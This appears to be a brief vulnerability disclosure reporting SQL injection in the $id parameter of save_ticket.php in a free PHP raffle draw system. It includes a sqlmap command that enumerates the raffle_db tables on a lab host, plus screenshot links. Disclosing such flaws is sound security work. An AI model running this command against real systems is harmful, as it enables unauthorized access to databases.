vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/15951/raffle-draw-system-using-php-and-javascript-free-source-code.html

Vulnerability trigger parameter: $id

The process of vulnerability discovery is as follows：
![image](https://user-images.githubusercontent.com/30823782/213212381-a0b213fe-62e1-43e1-9dbf-8d1915589bb5.png)

sqlmap.py -u "http://192.168.249.88/php-js-raffle-draw/save_ticket.php" --data "id=1" -D raffle_db --tables

![image](https://user-images.githubusercontent.com/30823782/213212528-31d95845-8c5e-438b-9808-c70cbea59fee.png)

